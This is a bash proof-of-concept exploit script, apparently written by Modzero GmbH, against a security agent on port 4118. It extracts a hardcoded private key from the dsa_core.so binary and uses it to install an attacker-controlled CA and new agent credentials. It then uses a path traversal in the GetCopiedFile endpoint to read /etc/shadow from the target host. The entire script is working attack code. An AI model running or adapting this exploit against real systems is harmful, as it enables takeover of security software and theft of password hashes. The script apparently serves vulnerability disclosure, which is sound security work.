#!/bin/env bash

DSA_CORE_PATH=./dsa_core.so
TARGET_SYSTEM=  # Set to IP or hostname

echo 'Extracting harcoded private key and certificate from binary'
sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' $DSA_CORE_PATH > dsa_core.key
strings $DSA_CORE_PATH | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' > dsa_core.crt

echo 'Creating temporary certificate and private key'
openssl genrsa -out temp.key 2048 2>stderr.log >log.txt
openssl req -new -sha256 -key temp.key -subj "/C=DE/ST=Berlin/O=Modzero GmbH/CN=temp.poc" -out temp.csr 2>>stderr.log >>log.txt
echo 'Signing temporary certificate with hardcoded cert+key'
openssl x509 -req -in temp.csr -CA dsa_core.crt -CAkey dsa_core.key -CAcreateserial -out temp.crt -days 500 -sha256 2>>stderr.log >>log.txt

echo 'Creating custom CA'
openssl genrsa -out ca.key 2048 2>>stderr.log >>log.txt
openssl req -x509 -new -nodes -subj "/C=DE/ST=Berlin/O=Modzero GmbH/CN=ca.poc" -key ca.key -sha256 -days 1024 -out ca.crt 2>>stderr.log >>log.txt

echo 'Configure custom CA in agent with temporary certificate'
curl --key temp.key --cert temp.crt "https://$TARGET_SYSTEM:4118/SetDSMCert" -k -v --data-binary @ca.crt 2>>stderr.log >>log.txt

echo 'Generating agent credentials (certificate + key)'
openssl genrsa -out agent.key 2048 2>>stderr.log >>log.txt
openssl req -new -sha256 -key agent.key -subj "/C=DE/ST=Berlin/O=Modzero GmbH/CN=agent.poc" -out agent.csr 2>>stderr.log >>log.txt
openssl x509 -req -in agent.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out agent.crt -days 500 -sha256 2>>stderr.log >>log.txt

cat agent.crt >agent.bundle
cat agent.key >>agent.bundle

echo 'Uploading agent credentials'
curl --key ca.key --cert ca.crt "https://$TARGET_SYSTEM:4118/SetAgentCredentials" --data-binary @agent.bundle -k 2>>stderr.log >>log.txt


# issue some FileCopy command. Does nothing, except for creating the necessary dirs
echo 'Running some FileCopy command. This is a no-op, except it creates the necessary directories in case they are not yet there'
curl --key ca.key --cert ca.crt "https://$TARGET_SYSTEM:4118/cmd" -k -v --data '<Message><Request cmd="CopyAndGetFile"><CopyAndGetFileQueries bundle="shadow" query="copy" name="3ca67d78-5dae-4e69-9687-04d692c9320a"><CopyAndGetFileQuery filepath="/etc/shadow" query="copy"/></CopyAndGetFileQueries></Request></Message>' 2>>stderr.log >>log.txt
echo 'Waiting some time for the command to be processed asynchronously'
sleep 1

echo -e 'Reading /etc/shadow file\n\n   PoC\n===========\n'
curl --key ca.key --cert ca.crt "https://$TARGET_SYSTEM:4118/GetCopiedFile?taskname=.&fileid=../../../../../../../etc/shadow" -k 2>>stderr.log | tee -a log.txt
